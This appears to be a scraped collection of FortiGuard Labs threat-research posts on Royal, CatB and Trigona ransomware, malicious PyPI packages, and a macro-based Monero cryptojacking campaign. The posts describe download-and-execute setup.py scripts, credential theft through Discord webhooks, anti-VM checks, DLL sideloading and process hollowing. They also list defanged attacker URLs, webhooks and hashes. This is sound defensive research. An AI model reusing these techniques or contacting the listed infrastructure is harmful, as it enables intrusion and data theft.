Linux/Filecoder_Royal.A!tr FortiEDR also detects and mitigates the execution of ransomware through a combination of behavioral analysis and integration with machine learning and threat intelligence feeds. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. b57e5f0c857e807a03770feb4d3aa254d2c4c8c8d9e08687796be30e2093286c – SHA256 hash of the analyzed sample hxxp://royal2xthig3ou5hd7zsliqagy6yygk2cdelaxtni2fyad6dpmpxedid[.]onion – Royal Ransomware Portal ransomware,FortiGuards Labs,linux FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/royal-ransomware-targets-linux-esxi-servers"
  },
  {
    "title": "More Supply Chain Attacks via New Malicious Python Packages in PyPi",
    "content": "FortiGuard Labs Threat Research The FortiGuard Labs team has discovered another 0-day attack in the PyPI packages (Python Package Index) by themalware authors ‘Portugal’ and ‘Brazil’ who published the packages ‘xhttpsp’ and ‘httpssp’. These two packages were discovered on January 31, 2023, by monitoring an open-source ecosystem. They were both published on January 27, 2023. Each included one version and an empty description, as shown below. The two packages included the same malicious code in their setup.py installation script, which appears to be encoded with Base64. When we decoded the encoded string, we found python code, some of which are shown below. Within the string, we find an interesting URL, ‘http://54[.]237[.]36[.]60/inject/QrvxFGKvsSJ5E5bx', which the malware reads and then writes to a file to execute. This URL has not previously been detected by any other threat researchers. When accessing the URL, we found heavily obfuscated code, shown below. When we execute the decoded code from Figure 8, we notice that it drops a file to an arbitrary location with a random name and extension. This may be due to changes in the code every time the URL is refreshed. In this case, it drops the file to ‘%USER%\\AppData\\Local\\Temp’ as ‘yzulmvnb.jpg’ and sets a registry key for auto-run. When examining the dropped file, we observe that it is another script similar to the one shown in the URL contents. Let’s try executing this dropped file. One suspicious behavior when executing this file is that it drops a binary executable file to the ‘%USER%’ folder as ‘update.exe’. A handful of vendors flag this dropped executable file as malicious (SHA 256): 618c11e03328eb0cc47ac21964479901dfaaa8a038e4145e247374169d6528f9 As shown in Figure 14, it then runs a Powershell, which is another suspicious behavior. It also copies itself to ‘%USER%\\AppData\\Roaming\\Google’ as ‘Chrome.exe’ and sets autorun for this copied executable. When we dive into the ‘update.exe’ code, we see a binary embedded within it, as shown below. The embedded binary is a .dll file. As shown in the VirusTotal entry below, many vendors flag this binary, ‘Rdudkye.dll,’ as malicious (SHA 256): 19e9dbfe9df33f17664e780909054b48c62d3dd66e11f31f3a657d18ac4c752f While the code is very obfuscated, some functions give clues about what it may do or its capabilities. We can see some interesting functions such as DiscordApi, TelegramApi, Inject, ProcessHollowing, RemoteThreadInjection, HiddenStartup, etc. This blog shows that although the malicious python script may appear simple, it is more complex than it seems with multiple layers. With just a simple copy and paste of a brief code, malware authors are able to easily distribute malicious packages to steal or exfiltrate sensitive data through platforms such as Discord and Telegram. A good indication of a malicious package is when a lot of obfuscation is involved. This technique is quite common among malware authors, so it may be a wise idea for Python end users to check twice for this before using new packages. FortiGuard Labs notified Python Package Index administrators about this malicious package, and they have confirmed that it has been taken down. FortiGuard AntiVirus detects the malicious executables identified in this report as update.exe:MSIL/Agent.OQX!tr.dldr Rdudkye.dll:MSIL/Kryptik.AGJS!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. update.exe 618c11e03328eb0cc47ac21964479901dfaaa8a038e4145e247374169d6528f9 Rdudkye.dll 19e9dbfe9df33f17664e780909054b48c62d3dd66e11f31f3a657d18ac4c752f Malicious URLs http://54[.]237[.]36[.]60/inject/QrvxFGKvsSJ5E5bx Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. attack research,malicious,malware,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/more-supply-chain-attacks-via-new-malicious-python-packages-in-pypi"
  },
  {
    "title": "Ransomware Roundup – CatB",
    "content": "FortiGuard Labs Threat Research This bi-weekly Ransomware Roundup report from FortiGuard Labs looks at ransomware variants that have gained traction within our datasets and the wider OSINT community. It aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against these variants. This latest edition of the Ransomware Roundup covers the CatB ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High CatB is a reasonably new entrant to the ransomware field, with samples only dating back to December 2022. However, FortiGuard Labs has also found additional samples we believe with medium confidence to be from the same threat actor owing to their using the sameBitcoinwallet. These date to November 2022. The CatB threat actor does not offer a web portal (on TOR or otherwise) to name and shame victims. Contact is only available via an e-mail address in the ransom note. As of the time of writing, there is no indication that the malware operators use a Ransomware-as-a-Service model. Information on the infection vector used by this group is not currently available. However, it’s not likely to differ significantly from those used by other ransomware groups. CatB uses a dropper packaged into a Microsoft Windows Dynamic Link Library (.dll) file. Contained within the dropper is a second .dll file that contains the payload responsible for encrypting files on the victim’s machine. This particular version of CatB uses DLL sideloading to execute the payload’s code. (DLL sideloading places a malicious DLL file in the same directory as a trusted executable. When the executable tries to load a DLL with the same name, the attacker’s DLL is loaded instead.) Execution of the dropper is accomplished using the Windows “rundll32.exe” application. The dropper is packed using UPX, which unpacks the file and executes the code inside. Once the primary code executes, CatB creates an array of barriers to prevent analysis and execution on virtual machines/sandboxes. To validate that the malware has been loaded on a legitimate target, each barrier must be met before the payload is dropped and executed. Among the first of these is a check for the number of processors on the system. Given that most modern physical Windows devices are multi-processor/multi-core computers, there must be at least two to continue. In addition to multi-core processors, most current systems have more than 2GB of RAM installed. Figure 4 above shows a comparison being made to the value of 800 in hexadecimal. In decimal, this corresponds to 2048 or 2GB. The value must be this or greater to continue. The next test involves the hard disk. Most virtual machines are created with just enough resources to do their intended job, while a physical device will have much more. The dropper attempts to validate that the hard disk on the machine meets certain criteria. It uses the API call “DeviceIOControl” to determine this by passing a value of 70000 in hexadecimal. This corresponds to 458752, which is the control code for IOCTL_DISK_GET_DRIVE_GEOMETRY.  This provides a mechanism to obtain information on a physical disk (e.g. tracks, sectors and cylinders). If all checks pass, the dropper creates the file “oci.dll”. As mentioned, this version of CatB uses DLL sideloading to execute the payload in “oci.dll”. To do this, theMicrosoft Distributed Transaction Coordinator(MSDTC) service is used to facilitate the process. As MSTDC starts, it reads several DLLs from “C:\\windows\\system32”, which now contains the malicious version of “oci.dll”. CatB alters the username of the service to “LocalSystem” and then starts MSDTC. Even if one anti-VM check fails, MSDTC will still be started. However, it will quickly be followed by a termination event, thereby ending the execution of CatB. Otherwise, “oci.dll” begins its run to encrypt the host system. CatB looks for files to encrypt beyond just the “C:\\” drive, enumerating additional mounted hard drive volumes up to “I”. The ransomware will not encrypt anything that might be considered a functional system file that would prevent a possible recovery (and thereby eliminate any reason to pay a ransom). Interestingly, CatB does not deploy a ransom note in an obvious location (e.g., the user’s desktop) as other ransomware strains do. Instead, every encrypted file has the ransom note prepended to the top of the file. As shown in figures 11 and 12, the ransom demanded is steep at 50BTC on day 1. This is approximately $1,102,010.00 (as of the date of this writing). The cost escalates daily until day five, when it indicates that data will no longer be recoverable. The Bitcoin address used in this sample, along with similar ransomware samples FortiGuard Labs has found, had no funds at the time of writing. As mentioned earlier, the only contact method available is through the attacker’s Proton Mail address. Fortinet customers are already protected from this malware variant as follows: FortiGuard Labs detects known CatB ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. File-based IOCs: SHA256 IOC Type 3661ff2a050ad47fdc451aed18b88444646bb3eb6387b07f4e47d0306aac6642 CatB Dropper 83129ed45151a706dff8f4e7a3b0736557f7284769016c2fb00018d0d3932cfa Unpacked CatB Dropper 35a273df61f4506cdb286ecc40415efaa5797379b16d44c240e3ca44714f945b CatB Payload c8e0aa3b859ac505c2811eaa7e2004d6e3b351d004739e2a00a7a96f3d12430c CatB Payload 512587a73cd03c6324ade468689510472c6b9e54074f3cf115aa54393b14f037 CatB Malware Family 9990388776daa57d2b06488f9e2209e35ef738fd0be1253be4c22a3ab7c3e1e2 CatB Malware Family Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). If you think this or any other cybersecurity threat has impacted you, contact ourGlobal FortiGuard Incident Response Team. FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and our FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware,FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-catb-ransomware"
  },
  {
    "title": "Supply Chain Attack via New Malicious Python Packages by Malware Author Core1337",
    "content": "FortiGuard Labs Threat Research The FortiGuard Labs team recently discovered several new 0-day attacks in the PyPI packages (Python Package Index) by malware author ‘Core1337’, who published the following packages: ‘3m-promo-gen-api’, ‘Ai-Solver-gen’, ‘hypixel-coins’, ‘httpxrequesterv2’, and ‘httpxrequester’. These attacks were published between January 27 to January 29, 2023. Each package had one version and an empty description, and all contained similar malicious code. For brevity, this blog will examine the ‘3m-promo-gen-api’ package as representative of the entire set. The first thing we notice in its setup.py is what looks like a webhook URL: hxxps://discord[.]com/api/webhooks/1069214746395562004/sejnJnNA3lWgkWC4V86RaFzaiUQ3dIAG958qwAUkLCkYjJ7scZhoa-KkRgBOhQw8Ecqd Each package includes similar code in their setup.py except for the webhook URL. Examining the URL shows it may be related to a “Spidey Bot” malware known to steal personal information through Discord, as seen in our previous blog about the packageweb3-essential. When we perform a static analysis by looking through its setup.py script, we spot several potential malicious behaviors, described below. Note that all the figures are from setup.py. Looking at the primary function, we get a general idea of malware behavior that may try to retrieve sensitive information from different browsers and Discord and save it to a file for exfiltration. Let’s look at the ‘getPassw’ function, for example. Below, it attempts to gather user and password information from the browsers listed in Figure 6 and then save it to a text file. The list of websites in Figure 8 may be used for retrieving the information mentioned earlier. We also see that the malware names itself ‘Fade Stealer,’ which can be seen when it writes its name at the top of its text file. Similar behavior is found in its ‘getCookie’ function. Looking at the ‘upload’ function, we can see clear clues about what it may do, such as using the webhook URL to steal files and data, as discussed above. From the functions ‘Kiwi’, ‘KiwiFile’, and ‘uploadToAnonfiles’, we can safely assume that it looks through specific folders and picks up specific file names for file transfer through the file-sharing site ‘https://transfer.sh/’. Many of these keywords are related to logins, accounts, banks, etc. In this blog, a single malware author published several packages with entirely different names but with similar codes designed to launch attacks. The malware authors can executemalicious attackswith a single python script, such as stealing sensitive information using webhooks on Discord. FortiGuard Labs notified Python Package Index administrators about this malicious package, and they have confirmed that it has been taken down. FortiGuard AntiVirus detects the malicious scripts identified in this report as setup.py:Python/Agent.DC4D!tr.pws The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. If you think this or any other cybersecurity threat has impacted you, contact ourGlobal FortiGuard Incident Response Team. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. setup.py 915b75ea258a42c5c1916d18a42302bbafa960bdafea1588b772d5284eec1997 Malicious URLs hxxps://discord[.]com/api/webhooks/1069214746395562004/sejnJnNA3lWgkWC4V86RaFzaiUQ3dIAG958qwAUkLCkYjJ7scZhoa-KkRgBOhQw8Ecqd threat research,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-packages-by-malware-author-core1337"
  },
  {
    "title": "Supply Chain Attack by New Malicious Python Package, “web3-essential”",
    "content": "FortiGuard Labs Threat Research The FortiGuard Labs team has discovered another new 0-day attack in a PyPI package (Python Package Index) called “web3-essential”. It was discovered on January 30, 2023, by monitoring an open-source ecosystem. The package was published on January 26, 2023, the same day as its author, ‘Trexon’, joined the repository. Given the frequency of this pattern of simultaneously joining and publishing, it may be a wise idea to take precautions for downloading packages published by newly joined authors. The author included a brief description of the project along with a unique version number of ‘1.0.4b0’ as if to try and avoid suspicion. The package includes malicious code in its setup.py installation script that downloads and runs an executable file as a part of its installation. The interesting element is the URL, which requires deeper analysis: hxxps://cdn[.]discordapp[.]com/attachments/1068100530498449468/1068239485613125702/ily[.]exe As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256): 43c89b9263f78ef870bf205e92f7912c8b2845d33391b46cd747d45a5632aea0. While this download URL is only detected by one vendor, a few vendors do flag the downloaded executable file as malicious. The downloaded executable seems to be a Go-compiled executable file. Let’s try running it. One suspicious behavior conducted by ‘ily.exe’ is that it creates DB files in the ‘%USER%\\AppData\\Local\\cloudflare-warp-cache\\raw\\’ folder. This may be used for recording sensitive user data and credentials. Let’s take a look at the DB files below. We can safely assume they will be used for saving sensitive data and credentials, such as credit card and log-in information. When we take a look inside the binary using IDA, we see many strings that raise suspicions. We can also get some clues about the malware behavior by observing these. Some keywords of interest include, ‘virus’, ‘wallets’, ‘browsers’, ‘login’, and ‘passwords’. Below we can also see some strings with ‘.zip’ for several browser names which could be indication of saving the sensitive information as a zip file. The examples in the code shown below are of the browsers that the malware takes an interest in. We also found an interesting URL embedded in the code: hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy It uses a Go package, ‘dishooks’, which is a Discord webhook API wrapper. Within the URL, we see that it may be related to a “Spidey Bot” malware which is known to steal personal information through Discord. In this blog, we saw a new author upload a malicious package on the same day as they joined. This package included a very simple python script that leads to downloading a malicious binary executable designed to steal sensitive information like credit cards and logins. In our previous blogs looking at malicious PyPI packages, we have observed that malware authors commonly behave in this way. We have also learned that these malicious executable are also frequently compiled using a variety of compilers, such as Go-compiler or PyInstaller, etc. Python Package Index administrators have confirmed that after notification by FortiGuard Labs, this package has been taken down.FortiGuard AntiVirus detects the malicious executables identified in this report as ily.exe:W64/Stealer.679E!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. If you think you’ve been impacted by this or any other cybersecurity threat, reach out to ourGlobal FortiGuard Incident Response Team. ily.exe 43c89b9263f78ef870bf205e92f7912c8b2845d33391b46cd747d45a5632aea0 Malicious URLs hxxps://cdn[.]discordapp[.]com/attachments/1068100530498449468/1068239485613125702/ily[.]exe Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. 0-day,threat research,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-by-new-malicious-python-package-web3-essential"
  },
  {
    "title": "Ransomware Roundup – Trigona",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Trigona ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High The Trigona ransomware variant was first reported in October 2022. Trigona has adopted the double-extortion methodology of encrypting endpoints and/or other infrastructure of value within an organization and then threatening to release exfiltrated data from those machines on the internet if a ransom is not paid. As proof that users can get affected files back, the Trigona threat actor offers free decryption of up to three files. Some public reports suggest Trigona ransomware activity picked up towards the end of 2022. While the infection vector has not been identified, deployment via other malware distributed using emails, Remote Desktop Protocol (RDP), and exploiting vulnerabilities are suspected distribution methods. When launched, the ransomware encrypts files on compromised machines and adds a “._locked” file extension to those encrypted files. It also leaves a “how_to_decrypt.hta” file, shown below. This is an HTML file that contains details on how to recover encrypted data as well as how to contact the Trigona ransomware threat actor. While a download link for the Tor browser is available in the ransom note, it no longer worked at the time of the investigation. As such, users are expected to find and visit the official Tor site to download and install the Tor browser. Once a link to the decryption page is copied and opened on the Tor browser, Trigona ransomware victims are presented with a sign-up page where they can enter a key left in the ransom note. In the next screen, victims are asked to enter a username and set a login password. Some variants of Trigona ransomware do not direct victims to the Tor site. Instead, the ransom note asks victims to email the attacker. Publicly available reports indicate that victims are asked to buy and pay an unknown amount of ransom in Monero (XMR) cryptocurrency after logging into the Tor site. The Tor site also offers a victim support chat option. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Trigona ransomware variants with the following AV signature: File-based IOCs: SHA256 248e7d2463bbfee6e3141b7e55fa87d73eba50a7daa25bed40a03ee82e93d7db 596cf4cc2bbe87d5f19cca11561a93785b6f0e8fa51989bf7db7619582f25864 704f1655ce9127d7aab6d82660b48a127b5f00cadd7282acb03c440f21dae5e2 859e62c87826a759dbff2594927ead2b5fd23031b37b53233062f68549222311 8f8d01131ef7a66fd220dc91388e3c21988d975d54b6e69befd06ad7de9f6079 97c79199c2f3f2edf2fdc8c59c8770e1cb8726e7e441da2c4162470a710b35f5 a86ed15ca8d1da51ca14e55d12b4965fb352b80e75d064df9413954f4e1be0a7 accd5bcf57e8f9ef803079396f525955d2cfffbf5fe8279f744ee17a7c7b9aac da32b322268455757a4ef22bdeb009c58eaca9717113f1597675c50e6a36960a e7c9ec3048d3ea5b16dce31ec01fd0f1a965f5ae1cbc1276d35e224831d307fc e97de28072dd10cde0e778604762aa26ebcb4cef505000d95b4fb95872ad741b f29b948905449f330d2e5070d767d0dac4837d0b566eee28282dc78749083684 fa6f869798d289ee7b70d00a649145b01a93f425257c05394663ff48c7877b0d fbba6f4fd457dec3e85be2a628e31378dc8d395ae8a927b2dde40880701879f2 fd25d5aca273485dec73260bdee67e5ff876eaa687b157250dfa792892f6a1b6 Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. threat research,ransomware,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-trigona-ransomware"
  },
  {
    "title": "Analyzing Malware Code that Cryptojacks System to Mine for Monero Crypto",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs recently captured Excel documents in the Microsoft OLE Compound File format that contain malicious VBA Macros. Their file names are Pago_detalles.xls, makbuzu.xls, and Pago.xls. I then conducted deep research on them and found that they all belong to the same malicious campaign that cryptojacks systems to mine for Monero (XMR) cryptocurrency. Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Cryptojack Victim’s Device to Mine CryptocurrencySeverity level:Critical In this analysis, I will show how the crypto miner software is delivered by opening the Excel document and how it is executed on a victim’s device. I also look at the techniques it uses to prevent its code from being analyzed, how it gains persistence on the victim’s device, and how the malware performs process hollowing to execute the Monero miner on the victim’s device. The content and VBA project are similar in all three Excel documents. When the document is opened in Microsoft Excel, as shown in Figure 1.1, it pops up a yellow warning bar to alert the user that the document contains a risky Macro project, which will be executed once the “Enable Content” button is clicked. Given that the content is written in Spanish, this campaign targets Spanish-speaking people. It shows a blurred picture of a statement that tricks the user into clicking the button on the yellow bar for a clearer view. The VBA Macro project is password protected from viewing, editing, and debugging. Once I disarmed its protections, I found an auto-execution sub-procedure Workbook_Open() in the project that is executed automatically once the Excel document is opened. After deobfuscating the VBA statements, it is easy to understand the purpose of the sub-procedure Workbook_Open(), as shown in Figure 1.2. It downloads a file from hxxps[:]//www[.]tractorandinas[.]com/wocontent/templates.exe, saves it into the system’s Templates folder, and renames it “GHJFRGUNL.exe”. At the end of the Workbook_Open() auto-run procedure, it calls “FPKGNSJJDW_Shell_Application.Open (VMNXMOV_local_file)” to run the downloaded file on the victim’s device. The downloaded file “GHJFRGUNL.exe” was developed using Microsoft .Net Framework and is protected by an obfuscator called “ConfuserEx v1.0.0”. By deobfuscating the file, I located a .Net Exe file, which is easier for analysts to use to comprehend its work-flows. It contains a .Net resource, which can be obtained with its resource name “Fyyxdkrpjokzonmmc” by calling the API ResourceManager.GetObject(). Figure 2.1 is a screenshot of the deobfuscated Exe file in an analysis tool. The .Net resource is shown on the right. The resource's data is a GZip-compressed .Net module (DLL) file. It is extracted in memory and then loaded. Figure 2.2 shows the context code of doing that. Next, it gets the type of the entry point function for the .Net module and calls it by calling the API Type.InvokeMember(). The function is named \"YLbTOcLUZT\" and is defined under the namespace.class “DKNYEHTGFSSZDfys0h6.dOICUYTjc8hIf6usABv”. Figure 2.3 shows the dynamically loaded .Net module in a .Net debugger, where it breaks at the entry point function. As you may have noticed, the module is thoroughly obfuscated, including the class name, variable names, obfuscated workflow, and more. It also includes functions to perform anti-tamper checks during the run time. These cause the system to crash if it detects any modifications made to the module. That means that it’s hard to deobfuscate. This was my biggest challenge in analyzing it. According to my analysis, the downloaded file is like a malware loader and installer, and the .Net module is the payload module for the malware. The payload module determines if the current process file (“GHJFRGUNL.exe”) is located in the system “%AppData%” folder and runs with Administrator privilege. If not, it will exit the process and rerun it with Administrator privilege, popping up a message for the victim to confirm. It copies the Exe file into the “%AppData%” folder and adds it to the system Task Scheduler. This ensures the process launches at startup and runs every two minutes. It breaks at a function, as shown in Figure 3.1, where it uses a TaskScheduler object to create the new task with the TaskDefinition displayed at the bottom. The new task’s name is from the process name “GHJFRGUNL”. Figure 3.2 is the screenshot of the system Task Scheduler. You can see that a new task has been created with the process name. Once completed, it can launch at system startup. The Task Scheduler repeatedly starts “GHJFRGUNL.exe” every two minutes in case the process or its sub-processes are killed by the victim due to high consumption of hardware resources (like CPU and memory). It also has a strategy for keeping only one process running simultaneously using a Mutex object. Its config block data is base64 encoded in the payload module (“Fyyxdkrpjokzonmmc.dll”), which is decoded and loaded in a config block. This contains the malware configuration data, like flags that tell the malware how to work, its C2 server domain string and port numbers, malware variant name, and crypto key used to encrypt and decrypt packets between the client and C2 server. The decoded config block data is a stream of bytes converted into an object by calling the Deserialize()function(from a third-party module, protobuf-net.dll). The config object is used throughout the payload module lifetime. Figure 4.1 is a screenshot of the config data being deserialized into a global variable. There are two TCP port numbers in the config object. It repeatedly attempts to connect to the C2 server with two ports, one by one, until a connection is established. Next, it gathers basic information from the victim’s device, encrypts the collected information, and sends it to its C2 server. Figure 4.2 shows when the malware is about to call a function to encrypt the collected information carried by variable “u” and send it to the C2 server. The collected information consists of many of the items shown below: It uses a Triple DES cipher algorithm to encrypt and decrypt the data between the malware and its C2 server. Figure 4.3 shows the encrypted packets captured by Wireshark. The cryptography key is \"57dd8b6cc78fd8f51c2f5a\", taken from the config object. Steps for sending data to the C2 server Steps for receiving data from the C2 server Figure 4.4 shows the entire set of received data responding to the first packet with collected information to the C2 server. It has been converted into an object variable (referred to as a response object) from a byte stream. The response object leads the malware to execute further unauthorized actions on the victim’s device. In the response object, there are two Onedriver URLs from which the malware will download two files. The two MD5 values in the response object are the hash values of the two files. It does not save the files to local folders but to the system registry under its sub-key, as shown in Figure 4.5. The sub-key name “96f709c1c080fbcb92806bd724266a03” is the victim ID, as I mentioned earlier. It is generated with the device hardware information. The names of the values are the two files’ MD5 values, and the data is the content of the two files. It won’t download the two files if the relevant registry values exist. Both of them are compressed PE files, which are named “plugin_3.dll” (File size: 2.3Mb, MD5:78B10BAE1DB822E486A2393F0ADBE627) and “plugin_4.dll” (File size: 37Kb, MD5: A722D3BCD1D9056D1BBE840197059BCE) on the website. To explain how they work together, I will refer to them by their names. Decompressing “plugin_4.dll” gets a .Net dll file (“ClassLibrary1.dll”), which is used to perform process hollowing. “plugin_3.dll” contains an Exe file (“xmrig.exe”, the XMR Miner) that will be injected into another process by “plugin_4.dll”. The payload module (“Fyyxdkrpjokzonmmc”) proceeds to dynamically load “ClassLibrary1.dll”, which is also thoroughly obfuscated. Its function, Plugin.Plugin.Run(), is the entry point function for process hollowing. After “xmrig.exe” is decompressed in memory, as shown in Figure 5.1, it calls the API CreateProcess() to create a process called \"AddInProcess.exe\", which is from the response object (refer to Figure 4.4). The function parameter Creation Flag is 12 (i.e.,CREATE_SUSPENDED | DETACHED_PROCESS). Later, it calls a bunch of key Windows APIs, such as VirtualAlloc(), GetThreadContext(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(), to deploy the “xmrig.exe” into the newly-created “AddInProcess.exe” process. Afterward, “xmrig.exe” runs as “AddInProcess.exe”, and the malware payload module becomes the daemon process to the process-hollowed process to prevent it from being killed. XMRig is a high-performance, open-source, cross-platform (Windows, Linux, Android, and macOS) cryptocurrency miner application, which is both a CPU and GPU miner supporting RandomX, KawPow, CryptoNight, and GhostRider algorithms. However, this platform is also commonly abused by cybercriminals to perform cryptojacking, which means hackers hijack the victim’s computing resources to mine cryptocurrencies on their behalf. “xmrig.exe” is XMrig’s Windows version application. It can use the CPU to mine for Monero coins. I manually decompressed the miner application from the downloaded “plugin_3.dll” into “plugin_3_1.exe”. You can see the detailed properties of this file in Figure 6.1. Taking a look back at the Process Hollowing section, it created a 